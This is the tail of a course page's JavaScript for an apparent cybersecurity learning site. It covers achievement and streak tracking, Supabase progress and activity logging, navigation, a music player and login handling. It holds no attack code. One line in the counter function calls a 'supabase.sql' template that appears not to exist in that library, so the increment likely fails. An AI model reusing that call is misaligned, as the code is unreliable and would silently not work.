        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
          await supabase
            .from("profiles")
            .update({
              [counterType]: supabase.sql`${counterType} + 1`,
            })
            .eq("id", currentUser.id);

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/wireless-pen-testing-defense-first.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>
